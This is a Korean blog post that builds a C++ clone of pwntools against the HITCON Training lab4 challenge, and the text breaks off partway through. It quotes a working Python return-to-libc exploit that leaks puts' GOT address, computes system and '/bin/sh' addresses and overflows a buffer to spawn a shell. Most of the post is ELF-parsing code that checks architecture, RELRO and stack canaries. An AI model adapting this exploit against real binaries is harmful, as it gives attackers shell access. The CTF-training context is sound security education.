
## **LAB4**


라이브러리로 작성된 완전한 코드는 아래에서 확인 가능하다.<br>
[https://github.com/lucid78/pwntoolscpp](https://github.com/lucid78/pwntoolscpp){: target="_blank"}
{: .notice--info}


이제 가장 기본적인 기능은 어느정도 완성되었고, lab3에서도 동작하는 것을 확인했으니 이번에는 lab4를 공략해보자.
<br>
아래는 [https://bachs.tistory.com/entry/HITCON-Training-lab4-return-to-library](https://bachs.tistory.com/entry/HITCON-Training-lab4-return-to-library) 에서 발췌한 lab4를 공략하는 exploit이다.


```cpp
from pwn import *
 
p = process('./ret2lib')
e = ELF('./ret2lib')
 
#found address of puts got
log.info("found address of puts got : %s" % hex(e.got["puts"]))
puts_got = e.got["puts"]
 
p.recvuntil(":")
p.send(str(puts_got))
 
puts_addr = p.recvline()
puts_addr = int(puts_addr.split(":")[1].strip(), 16) 
 
sys_offset   = 0x24d40
binsh_offset = 0xfd548
 
system_addr = puts_addr - sys_offset
binsh_addr  = puts_addr + binsh_offset
 
log.info("address of puts : %s" % hex(puts_addr))
log.info("address of system : %s" % hex(system_addr))
log.info("address of /bin/sh string : %s" % hex(binsh_addr))
 
payload  = ""
payload += "a"*60 #dummy 60bytes
payload += p32(system_addr)
payload += "aaaa"
payload += p32(binsh_addr)
 
p.recvuntil(":")
p.send(payload)
p.interactive()

출처: https://bachs.tistory.com/entry/HITCON-Training-lab4-return-to-library [Bach`s Blog]
```

<br>
위의 exploit을 보면 PROCESS 클래스에 recvline()이라는 함수와 ELF라는 class가 추가된 것이 보인다. 또한 hex()와 str()이라는 함수가 추가된 것도 보인다.
hex()와 str() 함수는 아래와 같이 구현할 수 있다. str()의 경우 c++ 라이브러리에서 제공하는 std::to_string()을 사용하면 되지만, 최대한 pwntools와 비슷하게 만들어 보기 위해서 추가로 구현하였다.<br>
아래는 추가된 hex()와 str() 함수이다.
```cpp
std::string hex(const int& addr)
{
    std::stringstream stream;
    stream << "0x" << std::setw(8) << std::setfill('0') << std::hex << addr;
    return stream.str();
}

std::string str(const int& num)
{
    return std::to_string(num);
}

```

<br>
## **RECV_LINE**
recv_line()은 이전에 구현했던 recv_until()을 이용하면 굉장히 쉽게 구할 수 있다. 바로 '\n'을 만날때까지 읽으면 되기 때문에 아래와 같이 간단히 구현할 수 있다.
```cpp
const std::string recv_line()
{
    return recv_until("\n");
}
```


## **ELF**
ELF는 got()라는 함수를 호출하고 있는데, elf 포맷에서 got에 위치한 function의 address를 가지고 오는 기능을 가지고 있다. 이 기능을 완성하기 위해서는 ELF를 Parsing 해야 하지만 이미 구현된 훌륭한 라이브러리들이 많으므로 기존의 것을 이용하기로 결정했다.
<br>
나는 github에서 배포되고 있는 c++로 제작된 많은 ELF Parser들 중에서 elfio를 선택했다.<br>
[https://github.com/serge1/ELFIO](https://github.com/serge1/ELFIO){:target="_blank"}

ELFIO는 header-only 프로그램이며 어떤 의존성도 없기 때문에, ELFIO 하나로 모든 기능을 다 수행할 수 있다는 장점이 있다. 또한 example들 중의 하나인 elfio_dump.hpp에 필요로 하는 대부분의 기능이 구현되어 있기 때문에 최소한의 작업으로 원하는 결과를 이끌어 낼 수 있다.

ELFIO를 ptcpp 디렉토리 내에 clone한 후 elfio 디렉토리 내의 elfio 디렉토리만 상위 디렉토리로 옮기고 elfio 디렉토리는 삭제한다. 그리고 ELF 클래스를 추가하고 main.cpp에 아래 두 개의 헤더를 추가한다.

```cpp
#include "elfio/elfio.hpp"
#include <elfio/elf_types.hpp>
```

<br>
pwntools의 ELF 클래스는 PROCESS 클래스처럼 실행할 프로그램 경로를 변수로 전달받는데, 아래와 같이 Arch, RELRO, Stack, NX, PIE 정보가 기본으로 출력된다.
<br>
![full](/assets/images/bachs.png)

출처: [https://bachs.tistory.com/entry/HITCON-Training-lab4-return-to-library](https://bachs.tistory.com/entry/HITCON-Training-lab4-return-to-library)


## **ARCH**

먼저 Arch를 출력하는 기능을 만들어보자.
<br>
위의 화면에서 Arch는 machine type, architecture, endian의 3가지 정보를 출력한다. 이 정보를 ELF Format에서 알아내기 위해 실행파일을 로드해야 하는데 ELFIO를 아래와 같이 사용할 수 있다.

```cpp
ELFIO::elfio reader;
if(!reader.load(path))
{
    std::cerr << "Can't find or process ELF file " << path << std::endl;
    exit(-1);
}
```

<br>
machine type은 ELFIO가 제공하는 함수 중 하나인 get_machine() 함수를 사용하면 된다.
```cpp
reader.get_machine();
```


<br>
다만 이 함수가 돌려주는 값은 unsigned short이기 때문에, 적절한 문자열로 매칭시켜 출력해야 한다. 따라서 매칭되는 문자열로 변경시켜 줄 데이터가 필요하며 이를 map으로 구현하였다. 아래의 정보는 elfio_dump.hpp에 정의되어 있는 정보를 사용하였다.

```cpp
std::unordered_map<ELFIO::Elf64_Half, std::string> machines = {
        { EM_NONE, "No machine" },
        { EM_M32, "AT&T WE 32100" },
        { EM_SPARC, "SUN SPARC" },
        { EM_386, "Intel 80386" },
        { EM_68K, "Motorola m68k family" },
        { EM_88K, "Motorola m88k family" },
        { EM_486, "Intel 80486// Reserved for future use" },
        { EM_860, "Intel 80860" },
        { EM_MIPS, "MIPS R3000 (officially, big-endian only)" },
        { EM_S370, "IBM System/370" },
        { EM_MIPS_RS3_LE, "MIPS R3000 little-endian (Oct 4 1999 Draft) Deprecated" },
        { EM_res011, "Reserved" },
        { EM_res012, "Reserved" },
        { EM_res013, "Reserved" },
        { EM_res014, "Reserved" },
        { EM_PARISC, "HPPA" },
        { EM_res016, "Reserved" },
        { EM_VPP550, "Fujitsu VPP500" },
        { EM_SPARC32PLUS, "Sun's v8plus" },
        { EM_960, "Intel 80960" },
        { EM_PPC, "PowerPC" },
        { EM_PPC64, "64-bit PowerPC" },
        { EM_S390, "IBM S/390" },
        { EM_SPU, "Sony/Toshiba/IBM SPU" },
        { EM_res024, "Reserved" },
        { EM_res025, "Reserved" },
        { EM_res026, "Reserved" },
        { EM_res027, "Reserved" },
        { EM_res028, "Reserved" },
        { EM_res029, "Reserved" },
        { EM_res030, "Reserved" },
        { EM_res031, "Reserved" },
        { EM_res032, "Reserved" },
        { EM_res033, "Reserved" },
        { EM_res034, "Reserved" },
        { EM_res035, "Reserved" },
        { EM_V800, "NEC V800 series" },
        { EM_FR20, "Fujitsu FR20" },
        { EM_RH32, "TRW RH32" },
        { EM_MCORE, "Motorola M*Core // May also be taken by Fujitsu MMA" },
        { EM_RCE, "Old name for MCore" },
        { EM_ARM, "ARM" },
        { EM_OLD_ALPHA, "Digital Alpha" },
        { EM_SH, "Renesas (formerly Hitachi) / SuperH SH" },
        { EM_SPARCV9, "SPARC v9 64-bit" },
        { EM_TRICORE, "Siemens Tricore embedded processor" },
        { EM_ARC, "ARC Cores" },
        { EM_H8_300, "Renesas (formerly Hitachi) H8/300" },
        { EM_H8_300H, "Renesas (formerly Hitachi) H8/300H" },
        { EM_H8S, "Renesas (formerly Hitachi) H8S" },
        { EM_H8_500, "Renesas (formerly Hitachi) H8/500" },
        { EM_IA_64, "Intel IA-64 Processor" },
        { EM_MIPS_X, "Stanford MIPS-X" },
        { EM_COLDFIRE, "Motorola Coldfire" },
        { EM_68HC12, "Motorola M68HC12" },
        { EM_MMA, "Fujitsu Multimedia Accelerator" },
        { EM_PCP, "Siemens PCP" },
        { EM_NCPU, "Sony nCPU embedded RISC processor" },
        { EM_NDR1, "Denso NDR1 microprocesspr" },
        { EM_STARCORE, "Motorola Star*Core processor" },
        { EM_ME16, "Toyota ME16 processor" },
        { EM_ST100, "STMicroelectronics ST100 processor" },
        { EM_TINYJ, "Advanced Logic Corp. TinyJ embedded processor" },
        { EM_X86_64, "Advanced Micro Devices X86-64 processor" },
        { EM_PDSP, "Sony DSP Processor" },
        { EM_PDP10, "Digital Equipment Corp. PDP-10" },
        { EM_PDP11, "Digital Equipment Corp. PDP-11" },
        { EM_FX66, "Siemens FX66 microcontroller" },
        { EM_ST9PLUS, "STMicroelectronics ST9+ 8/16 bit microcontroller" },
        { EM_ST7, "STMicroelectronics ST7 8-bit microcontroller" },
        { EM_68HC16, "Motorola MC68HC16 Microcontroller" },
        { EM_68HC11, "Motorola MC68HC11 Microcontroller" },
        { EM_68HC08, "Motorola MC68HC08 Microcontroller" },
        { EM_68HC05, "Motorola MC68HC05 Microcontroller" },
        { EM_SVX, "Silicon Graphics SVx" },
        { EM_ST19, "STMicroelectronics ST19 8-bit cpu" },
        { EM_VAX, "Digital VAX" },
        { EM_CRIS, "Axis Communications 32-bit embedded processor" },
        { EM_JAVELIN, "Infineon Technologies 32-bit embedded cpu" },
        { EM_FIREPATH, "Element 14 64-bit DSP processor" },
        { EM_ZSP, "LSI Logic's 16-bit DSP processor" },
        { EM_MMIX, "Donald Knuth's educational 64-bit processor" },
        { EM_HUANY, "Harvard's machine-independent format" },
        { EM_PRISM, "SiTera Prism" },
        { EM_AVR, "Atmel AVR 8-bit microcontroller" },
        { EM_FR30, "Fujitsu FR30" },
        { EM_D10V, "Mitsubishi D10V" },
        { EM_D30V, "Mitsubishi D30V" },
        { EM_V850, "NEC v850" },
        { EM_M32R, "Renesas M32R (formerly Mitsubishi M32R)" },
        { EM_MN10300, "Matsushita MN10300" },
        { EM_MN10200, "Matsushita MN10200" },
        { EM_PJ, "picoJava" },
        { EM_OPENRISC, "OpenRISC 32-bit embedded processor" },
        { EM_ARC_A5, "ARC Cores Tangent-A5" },
        { EM_XTENSA, "Tensilica Xtensa Architecture" },
        { EM_VIDEOCORE, "Alphamosaic VideoCore processor" },
        { EM_TMM_GPP, "Thompson Multimedia General Purpose Processor" },
        { EM_NS32K, "National Semiconductor 32000 series" },
        { EM_TPC, "Tenor Network TPC processor" },
        { EM_SNP1K, "Trebia SNP 1000 processor" },
        { EM_ST200, "STMicroelectronics ST200 microcontroller" },
        { EM_IP2K, "Ubicom IP2022 micro controller" },
        { EM_MAX, "MAX Processor" },
        { EM_CR, "National Semiconductor CompactRISC" },
        { EM_F2MC16, "Fujitsu F2MC16" },
        { EM_MSP430, "TI msp430 micro controller" },
        { EM_BLACKFIN, "ADI Blackfin" },
        { EM_SE_C33, "S1C33 Family of Seiko Epson processors" },
        { EM_SEP, "Sharp embedded microprocessor" },
        { EM_ARCA, "Arca RISC Microprocessor" },
        { EM_UNICORE, "Microprocessor series from PKU-Unity Ltd. and MPRC of Peking University" },
        { EM_EXCESS, "eXcess: 16/32/64-bit configurable embedded CPU" },
        { EM_DXP, "Icera Semiconductor Inc. Deep Execution Processor" },
        { EM_ALTERA_NIOS2, "Altera Nios II soft-core processor" },
        { EM_CRX, "National Semiconductor CRX" },
        { EM_XGATE, "Motorola XGATE embedded processor" },
        { EM_C166, "Infineon C16x/XC16x processor" },
        { EM_M16C, "Renesas M16C series microprocessors" },
        { EM_DSPIC30F, "Microchip Technology dsPIC30F Digital Signal Controller" },
        { EM_CE, "Freescale Communication Engine RISC core" },
        { EM_M32C, "Renesas M32C series microprocessors" },
        { EM_res121, "Reserved" },
        { EM_res122, "Reserved" },
        { EM_res123, "Reserved" },
        { EM_res124, "Reserved" },
        { EM_res125, "Reserved" },
        { EM_res126, "Reserved" },
        { EM_res127, "Reserved" },
        { EM_res128, "Reserved" },
        { EM_res129, "Reserved" },
        { EM_res130, "Reserved" },
        { EM_TSK3000, "Altium TSK3000 core" },
        { EM_RS08, "Freescale RS08 embedded processor" },
        { EM_res133, "Reserved" },
        { EM_ECOG2, "Cyan Technology eCOG2 microprocessor" },
        { EM_SCORE, "Sunplus Score" },
        { EM_SCORE7, "Sunplus S+core7 RISC processor" },
        { EM_DSP24, "New Japan Radio (NJR) 24-bit DSP Processor" },
        { EM_VIDEOCORE3, "Broadcom VideoCore III processor" },
        { EM_LATTICEMICO32, "RISC processor for Lattice FPGA architecture" },
        { EM_SE_C17, "Seiko Epson C17 family" },
        { EM_TI_C6000, "Texas Instruments TMS320C6000 DSP family" },
        { EM_TI_C2000, "Texas Instruments TMS320C2000 DSP family" },
        { EM_TI_C5500, "Texas Instruments TMS320C55x DSP family" },
        { EM_res143, "Reserved" },
        { EM_res144, "Reserved" },
        { EM_res145, "Reserved" },
        { EM_res146, "Reserved" },
        { EM_res147, "Reserved" },
        { EM_res148, "Reserved" },
        { EM_res149, "Reserved" },
        { EM_res150, "Reserved" },
        { EM_res151, "Reserved" },
        { EM_res152, "Reserved" },
        { EM_res153, "Reserved" },
        { EM_res154, "Reserved" },
        { EM_res155, "Reserved" },
        { EM_res156, "Reserved" },
        { EM_res157, "Reserved" },
        { EM_res158, "Reserved" },
        { EM_res159, "Reserved" },
        { EM_MMDSP_PLUS, "STMicroelectronics 64bit VLIW Data Signal Processor" },
        { EM_CYPRESS_M8C, "Cypress M8C microprocessor" },
        { EM_R32C, "Renesas R32C series microprocessors" },
        { EM_TRIMEDIA, "NXP Semiconductors TriMedia architecture family" },
        { EM_QDSP6, "QUALCOMM DSP6 Processor" },
        { EM_8051, "Intel 8051 and variants" },
        { EM_STXP7X, "STMicroelectronics STxP7x family" },
        { EM_NDS32,
        "Andes Technology compact code size embedded RISC processor family" },
        { EM_ECOG1, "Cyan Technology eCOG1X family" },
        { EM_ECOG1X, "Cyan Technology eCOG1X family" },
        { EM_MAXQ30, "Dallas Semiconductor MAXQ30 Core Micro-controllers" },
        { EM_XIMO16, "New Japan Radio (NJR) 16-bit DSP Processor" },
        { EM_MANIK, "M2000 Reconfigurable RISC Microprocessor" },
        { EM_CRAYNV2, "Cray Inc. NV2 vector architecture" },
        { EM_RX, "Renesas RX family" },
        { EM_METAG, "Imagination Technologies META processor architecture" },
        { EM_MCST_ELBRUS, "MCST Elbrus general purpose hardware architecture" },
        { EM_ECOG16, "Cyan Technology eCOG16 family" },
        { EM_CR16, "National Semiconductor CompactRISC 16-bit processor" },
        { EM_ETPU, "Freescale Extended Time Processing Unit" },
        { EM_SLE9X, "Infineon Technologies SLE9X core" },
        { EM_L1OM, "Intel L1OM" },
        { EM_INTEL181, "Reserved by Intel" },
        { EM_INTEL182, "Reserved by Intel" },
        { EM_res183, "Reserved by ARM" },
        { EM_res184, "Reserved by ARM" },
        { EM_AVR32, "Atmel Corporation 32-bit microprocessor family" },
        { EM_STM8, "STMicroeletronics STM8 8-bit microcontroller" },
        { EM_TILE64, "Tilera TILE64 multicore architecture family" },
        { EM_TILEPRO, "Tilera TILEPro multicore architecture family" },
        { EM_MICROBLAZE, "Xilinx MicroBlaze 32-bit RISC soft processor core" },
        { EM_CUDA, "NVIDIA CUDA architecture " }
    };
```
<br>
위에서 key에 해당하는 값들은 모두 elf_type.hpp에 정의되어 있는 값이다. 이제 구현한 map과 더불어 get_machine() 함수를 특정 문자열과 매칭시켜 아래와 같이 출력할 수 있다.

```cpp
std::cout << machines[reader.get_machine()] << std::endl;
```

<br>
architecture 정보 역시 EFLIO의 get_class() 함수를 사용하여 쉽게 알아낼 수 있다. 이 함수는 반환 값으로 elf_type.hpp에 정의된 값인 ELFCLASS32 또는 ELFCLASS64를 반환하는데, ELFCLASS32일 경우 32비트, 그 반대의 경우는 64비트이다. 따라서 아래와 같이 사용할 수 있다.

```cpp
std::cout << (reader.get_class() == ELFCLASS32 ? "32" : "64") << std::endl;
```

<br>
마지막으로 endian 역시 ELFIO의 get_encoding() 함수를 호출하여 반환값으로 판별 가능한데, 이 함수는 아래와 같이 3가지 종류의 값을 반환한다.

```cpp
ELFDATANONE: none,
ELFDATA2LSB: little,
ELFDATA2MSB: Big
```

<br>
역시 위 값들을 적절한 문자열로 매칭하는 map을 만들어서 아래와 같이 사용할 수 있다.

```cpp
std::unordered_map<char, std::string> endians = {
    { ELFDATANONE, "None" },
    { ELFDATA2LSB, "Little endian" },
    { ELFDATA2MSB, "Big endian" }
};
std::cout << endians[reader.get_encoding()] << std::endl;
```

<br>
아래는 위의 내용들을 종합하여 ELFIO로 실행파일 로딩 시 Arch 정보까지만 출력하는 코드 및 실행 결과이다. 지면 관계상 machines의 일부분은 생략하였다.


```cpp
#include <iostream>
#include <mutex>

#include <boost/process.hpp>
#include <boost/asio.hpp>
#include <boost/thread.hpp>
#include <boost/chrono.hpp>
#include <boost/endian/buffers.hpp>
#include <boost/format.hpp>

#include "elfio/elfio.hpp"
#include <elfio/elf_types.hpp>

class ELF
{
private:
    ELFIO::elfio reader;
    std::string m_path;
    std::unordered_map<ELFIO::Elf64_Half, std::string> machines = {
        { EM_NONE, "No machine" },
        { EM_M32, "AT&T WE 32100" },
        { EM_SPARC, "SUN SPARC" },
        { EM_386, "Intel 80386" },
        ...
        { EM_CUDA, "NVIDIA CUDA architecture " }
    };
    std::unordered_map<char, std::string> endians = {
        { ELFDATANONE, "None" },
        { ELFDATA2LSB, "Little endian" },
        { ELFDATA2MSB, "Big endian" }
    };

public:
    ELF(const std::string& path) : m_path(path)
    {
        if(!reader.load(path))
        {
            std::cerr << "Can't find or process ELF file " << path << std::endl;
            exit(-1);
        }

        std::cout << "[*] '" << m_path << std::endl;
        std::cout << "    Arch:     "
        << machines[reader.get_machine()] 
        << "-"
        << (reader.get_class() == ELFCLASS32 ? "32" : "64")
        << "-"
        << endians[reader.get_encoding()]
        << std::endl;
    }
};

int main()
{
    try
    {
        ELF e{"/tmp/hitcon/LAB/lab4/ret2lib"};
    }
    catch (std::exception& e)
    {
        std::cerr << "Exception: " << __FUNCTION__ << " " << e.what() << "\n";
    }

    return 0;
}
```

![full](/assets/images/arch.png)


<br>

## **RELRO**

pwntools나 checksec에서 RELRO를 판단하는 로직이 어떤 것인지에 대해 다음 블로그를 참고하였다. [https://chp747.tistory.com/215](https://chp747.tistory.com/215)

요약하면 segment header 중 PT_GNU_RELRO type을 가지는 segment가 있고, dynamic section에 DT_BIND_NOW flag가 있을 경우 Full Relro, DT_BIND_NOW가 없을 경우에는 Partial Relro, 둘 다 없을 경우에는 No Relro이다.

일단 EFLIO로 segment header의 type을 파싱하는 방법은 아래와 같다.

```cpp
for(ELFIO::Elf_Half i{0}; i < reader.segments.size(); ++i)
{
    ELFIO::segment* seg = reader.segments[i];
    std::cout << std::to_string(seg->get_type())) << std::endl;
}
```
<br>
따라서 PT_GNU_RELRO type인지 비교하는 코드만 아래와 같이 추가할 수 있다.

```cpp
std::string relro;
for(ELFIO::Elf_Half i{0}; i < reader.segments.size(); ++i)
{
    ELFIO::segment* seg = reader.segments[i];
    if(PT_GNU_RELRO == seg->get_type())
    {
        relro = "Partial RELRO";
        break;
    }
}
```

<br>
문제는 EFLIO의 type 정보에는 PT_GNU_RELRO 값이 없다. 따라서 해당 값을 수동으로 추가해 주어야만 한다.
<br>
아래는 readelf 프로그램을 이용해 ELF Format을 파싱했을 때와 동일한 결과값을 만들기 위하여 elf_types.hpp에 추가한 사용자 정의 값들의 목록이다.

```cpp
/* user add */
#define SHT_GNU_ATTRIBUTES  0x6ffffff5      /* Object attributes. */
#define SHT_GNU_HASH        0x6ffffff6      /* GNU-style hash table. */
#define SHT_GNU_LIBLIST     0x6ffffff7      /* Prelink library list */
#define SHT_CHECKSUM        0x6ffffff8      /* Checksum for DSO content. */
#define SHT_LOSUNW          0x6ffffffa      /* Sun-specific low bound. */
#define SHT_SUNW_move       0x6ffffffa
#define SHT_SUNW_COMDAT     0x6ffffffb
#define SHT_SUNW_syminfo    0x6ffffffc
#define SHT_GNU_verdef      0x6ffffffd      /* Version definition section. */
#define SHT_GNU_verneed     0x6ffffffe      /* Version needs section. */
#define SHT_GNU_versym      0x6fffffff      /* Version symbol table. */
#define SHT_HISUNW          0x6fffffff      /* Sun-specific high bound. */

#define PT_GNU_EH_FRAME     0x6474e550      /* GCC .eh_frame_hdr segment */
#define PT_GNU_STACK        0x6474e551      /* Indicates stack executability */
#define PT_GNU_RELRO        0x6474e552      /* Read-only after relocation */
#define PT_LOSUNW           0x6ffffffa
#define PT_SUNWBSS          0x6ffffffa      /* Sun Specific segment */
#define PT_SUNWSTACK        0x6ffffffb      /* Stack segment */
#define PT_HISUNW           0x6fffffff

#define	DT_NUM              35
#define DT_VALRNGLO         0x6ffffd00
#define DT_GNU_PRELINKED    0x6ffffdf5	    /* Prelinking timestamp */
#define DT_GNU_CONFLICTSZ   0x6ffffdf6	    /* Size of conflict section */
#define DT_GNU_LIBLISTSZ    0x6ffffdf7	    /* Size of library list */
#define DT_CHECKSUM         0x6ffffdf8
#define DT_PLTPADSZ         0x6ffffdf9
#define DT_MOVEENT          0x6ffffdfa
#define DT_MOVESZ           0x6ffffdfb
#define DT_FEATURE_1	    0x6ffffdfc	    /* Feature selection (DTF_*).  */
#define DT_POSFLAG_1	    0x6ffffdfd	    /* Flags for DT_* entries, effecting the following DT_* entry.  */
#define DT_SYMINSZ          0x6ffffdfe	    /* Size of syminfo table (in bytes) */
#define DT_SYMINENT         0x6ffffdff	    /* Entry size of syminfo */
#define DT_VALRNGHI         0x6ffffdff
#define DT_ADDRRNGLO        0x6ffffe00
#define DT_GNU_HASH         0x6ffffef5	    /* GNU-style hash table. */
#define DT_TLSDESC_PLT      0x6ffffef6
#define DT_TLSDESC_GOT      0x6ffffef7
#define DT_GNU_CONFLICT     0x6ffffef8	    /* Start of conflict section */
#define DT_GNU_LIBLIST      0x6ffffef9	    /* Library list */
#define DT_CONFIG           0x6ffffefa	    /* Configuration information. */
#define DT_DEPAUDIT         0x6ffffefb	    /* Dependency auditing. */
#define DT_AUDIT            0x6ffffefc	    /* Object auditing. */
#define	DT_PLTPAD           0x6ffffefd	    /* PLT padding. */
#define	DT_MOVETAB          0x6ffffefe	    /* Move table. */
#define DT_SYMINFO          0x6ffffeff	    /* Syminfo table. */
#define DT_ADDRRNGHI        0x6ffffeff
#define DT_FLAGS_1          0x6ffffffb	    /* State flags, see DF_1_* below. */
#define	DT_VERDEF           0x6ffffffc	    /* Address of version definition table */
#define	DT_VERDEFNUM        0x6ffffffd	    /* Number of version definitions */
#define	DT_VERNEED          0x6ffffffe	    /* Address of table with needed versions */
#define	DT_VERNEEDNUM       0x6fffffff	    /* Number of needed versions */
#define DT_VERSYM           0x6ffffff0
#define DT_RELACOUNT        0x6ffffff9
#define DT_RELCOUNT         0x6ffffffa
```

<br>
다음으로 Dynamic Section에서 BIND_NOW flag가 있는지 확인을 해야한다. ELFIO에서 Dynamic section을 탐색하면서 BIND_NOW flag를 체크하려면 dynamic_section_accessor 클래스로 Dynamic Section에 접근한 다음, get_entry() 함수를 호출하여 반환된 tag 정보를 확인하면 된다.
<br>아래는 BIND_NOW를 체크하는 코드이다.

```cpp
for(ELFIO::Elf_Half i{0}; i < reader.sections.size(); ++i )
{
    ELFIO::section* sec = reader.sections[i];
    if(SHT_DYNAMIC == sec->get_type())
    {
        ELFIO::dynamic_section_accessor dynamic(reader, sec);
        for(ELFIO::Elf_Xword i{0}; i < dynamic.get_entries_num(); ++i)
        {
            ELFIO::Elf_Xword   tag{0};
            ELFIO::Elf_Xword   value{0};
            std::string str;
            dynamic.get_entry(i, tag, value, str);
            if(DT_FLAGS == tag && value == DF_BIND_NOW)
            {
                relro = "Full RELRO";
            }
        }
    }
}
```

<br>
이제 지금까지 확인된 사항들을 모두 결합하여 RELRO 정보를 출력해보자. 아래는 현재까지 확인된 사항들을 모두 결합하여 RELRO 정보까지 출력하는 코드 및 실행 결과이다.

```cpp
#include <iostream>
#include <mutex>

#include <boost/process.hpp>
#include <boost/asio.hpp>
#include <boost/thread.hpp>
#include <boost/chrono.hpp>
#include <boost/endian/buffers.hpp>
#include <boost/format.hpp>

#include "elfio/elfio.hpp"
#include <elfio/elf_types.hpp>

class ELF
{
private:
    ELFIO::elfio reader;
    std::string m_path;
    std::unordered_map<ELFIO::Elf64_Half, std::string> machines = {
        { EM_NONE, "No machine" },
        { EM_M32, "AT&T WE 32100" },
        { EM_SPARC, "SUN SPARC" },
        { EM_386, "Intel 80386" },
        ...
        { EM_CUDA, "NVIDIA CUDA architecture " }
    };
    std::unordered_map<char, std::string> endians = {
        { ELFDATANONE, "None" },
        { ELFDATA2LSB, "Little endian" },
        { ELFDATA2MSB, "Big endian" }
    };

public:
    ELF(const std::string& path) : m_path(path)
    {
        if(!reader.load(path))
        {
            std::cerr << "Can't find or process ELF file " << path << std::endl;
            exit(-1);
        }

        std::cout << "[*] '" << m_path << std::endl;
        std::cout << "    Arch:     "
        << machines[reader.get_machine()] 
        << "-"
        << (reader.get_class() == ELFCLASS32 ? "32" : "64")
        << "-"
        << endians[reader.get_encoding()]
        << std::endl;

        std::cout << "    RELRO:    " << get_relro() << std::endl;
    }

    std::string get_relro()
    {
        std::string relro{"No RELRO"};

        // search segment headers
        for(ELFIO::Elf_Half i{0}; i < reader.segments.size(); ++i)
        {
            ELFIO::segment* seg = reader.segments[i];
            if(PT_GNU_RELRO == seg->get_type())
            {
                relro = "Partial RELRO";
                break;
            }
        }

        // search dynamic sections
        for(ELFIO::Elf_Half i{0}; i < reader.sections.size(); ++i )
        {
            ELFIO::section* sec = reader.sections[i];
            if(SHT_DYNAMIC == sec->get_type())
            {
                ELFIO::dynamic_section_accessor dynamic(reader, sec);
                for(ELFIO::Elf_Xword i{0}; i < dynamic.get_entries_num(); ++i)
                {
                    ELFIO::Elf_Xword tag{0};
                    ELFIO::Elf_Xword value{0};
                    std::string str;
                    dynamic.get_entry(i, tag, value, str);
                    if(DT_FLAGS == tag && value == DF_BIND_NOW)
                    {
                        relro = "Full RELRO";
                    }
                }
            }
        }
        return relro;
    }
};

int main()
{
    try
    {
        ELF e{"/tmp/hitcon/LAB/lab4/ret2lib"};
    }
    catch (std::exception& e)
    {
        std::cerr << "Exception: " << __FUNCTION__ << " " << e.what() << "\n";
    }

    return 0;
}
```
![full](/assets/images/relro.png)

<br>
## **STACK**

stack canary 체크를 위해서는 symbol 정보에서 "__stack_chk_fail" 가 존재하는지 여부를 확인하면 된다. symbol 정보를 확인하기 위해 symbol_section_accessor를 아래와 같이 이용할 수 있다.

```cpp
ELFIO::section* sec = reader.sections[i];
ELFIO::symbol_section_accessor symbol(reader, sec);
```

<br>
아래는 symbol을 수집하는 get_symbols() 코드이다. 수집된 symbol 정보들은 std::unordered_map<std::string, ELFIO::Elf64_Addr> symbols에 저장된다.

```cpp
void get_symbols()
{
    for(ELFIO::Elf_Half i = 0; i < reader.sections.size(); ++i)
    {
        ELFIO::section* sec = reader.sections[i];
        if(SHT_SYMTAB == sec->get_type() || SHT_DYNSYM == sec->get_type())
        {
            ELFIO::symbol_section_accessor symbol(reader, sec);
            for(ELFIO::Elf_Xword i = 0; i < symbol.get_symbols_num(); ++i)
            {
                std::string name;
                ELFIO::Elf64_Addr value{0};
                ELFIO::Elf_Xword  size{0};
                unsigned char bind{0};
                unsigned char type{0};
                ELFIO::Elf_Half section{0};
                unsigned char other{0};
                symbol.get_symbol(i, name, value, size, bind, type, section, other);
                if(!name.empty())
                {
                    symbols.emplace(name, value);
                }
            }
        }
    }   // end of for
}
```

<br>
symbol_section_accessor를 이용해 symbol을 수집한 후, "__stack_chk_fail"가 있는지 확인한다.

```cpp
std::string canary{"No canary found"};
for(const auto& [symbol, addr] : symbols)
{
    if(symbol.find("__stack_chk_fail") != std::string::npos)
    {
        canary = "Canary found";
        break;
    }
}
```

<br>
아래는 지금까지 확인한 사항들을 모두 결합하여 STACK 까지 출력하는 코드와 실행 결과이다.

```cpp
#include <iostream>
#include <mutex>

#include <boost/process.hpp>
#include <boost/asio.hpp>
#include <boost/thread.hpp>
#include <boost/chrono.hpp>
#include <boost/endian/buffers.hpp>
#include <boost/format.hpp>

#include "elfio/elfio.hpp"
#include <elfio/elf_types.hpp>

class ELF
{
private:
    ELFIO::elfio reader;
    std::string m_path;
    std::unordered_map<ELFIO::Elf64_Half, std::string> machines = {
        { EM_NONE, "No machine" },
        { EM_M32, "AT&T WE 32100" },
        { EM_SPARC, "SUN SPARC" },
        { EM_386, "Intel 80386" },
        ...
        { EM_CUDA, "NVIDIA CUDA architecture " }
    };
    std::unordered_map<char, std::string> endians = {
        { ELFDATANONE, "None" },
        { ELFDATA2LSB, "Little endian" },
        { ELFDATA2MSB, "Big endian" }
    };
    std::unordered_map<std::string, ELFIO::Elf64_Addr> symbols;
public:
    ELF(const std::string& path) : m_path(path)
    {
        if(!reader.load(path))
        {
            std::cerr << "Can't find or process ELF file " << path << std::endl;
            exit(-1);
        }

        std::cout << "[*] '" << m_path << std::endl;
        std::cout << "    Arch:     "
        << machines[reader.get_machine()] 
        << "-"
        << (reader.get_class() == ELFCLASS32 ? "32" : "64")
        << "-"
        << endians[reader.get_encoding()]
        << std::endl;

        std::cout << "    RELRO:    " << get_relro() << std::endl;
        std::cout << "    Stack:    " << get_canary() << std::endl;
    }

    std::string get_relro()
    {
        std::string relro{"No RELRO"};

        // search segment headers
        for(ELFIO::Elf_Half i{0}; i < reader.segments.size(); ++i)
        {
            ELFIO::segment* seg = reader.segments[i];
            if(PT_GNU_RELRO == seg->get_type())
            {
                relro = "Partial RELRO";
                break;
            }
        }

        // search dynamic sections
        for(ELFIO::Elf_Half i{0}; i < reader.sections.size(); ++i )
        {
            ELFIO::section* sec = reader.sections[i];
            if(SHT_DYNAMIC == sec->get_type())
            {
                ELFIO::dynamic_section_accessor dynamic(reader, sec);
                for(ELFIO::Elf_Xword i{0}; i < dynamic.get_entries_num(); ++i)
                {
                    ELFIO::Elf_Xword tag{0};
                    ELFIO::Elf_Xword value{0};
                    std::string str;
                    dynamic.get_entry(i, tag, value, str);
                    if(DT_FLAGS == tag && value == DF_BIND_NOW)
                    {
                        relro = "Full RELRO";
                    }
                }
            }
        }
        return relro;
    }

    std::string get_canary()
    {
        std::string canary{"No canary found"};

        //
        // canary check
        //
        get_symbols();
        for(const auto& [symbol, addr] : symbols)
        {
            if(symbol.find("__stack_chk_fail") != std::string::npos)
            {
                canary = "Canary found";
                break;
            }
        }
        return canary;
    }

private:
    void get_symbols()
    {
